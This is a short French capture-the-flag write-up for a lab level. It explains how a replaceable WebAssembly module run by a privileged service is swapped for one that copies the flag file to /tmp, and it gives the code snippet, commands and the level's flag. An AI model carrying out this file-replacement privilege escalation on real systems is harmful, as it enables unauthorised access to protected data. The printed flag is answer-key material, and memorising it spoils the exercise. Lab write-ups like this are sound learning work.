# Level 05 → Level 06

**Mot de passe du niveau :** flag de `level04`

## Vulnérabilité
Un service `metaverse` exécute périodiquement, avec les droits de `flag05`, un
module WebAssembly situé en `/opt/snowcrash/level05/metaverse.wasm` que l'on peut
remplacer. Un `.wasm` (WASI) accède au système de fichiers avec les droits du
service : on compile un module qui recopie le flag.

## Exploitation
1. Récupérer le `wasi-sdk` et compiler `metaverse.c` :
   ```c
   FILE* flag = fopen("/home/flag05/.flag", "r");
   FILE* out  = fopen("/tmp/wasmflag", "w");
   // read(flag) -> write(out)
   ```
2. `$CC metaverse.c -o metaverse.wasm`
3. `mv metaverse.wasm /opt/snowcrash/level05/metaverse.wasm`
4. Attendre l'exécution du service puis `cat /tmp/wasmflag`.

Source dans `ressource/metaverse.c`, automatisé dans `ressource/exploit.sh`.

## Flag
```
viuaaale9huek52boumoomioc
```
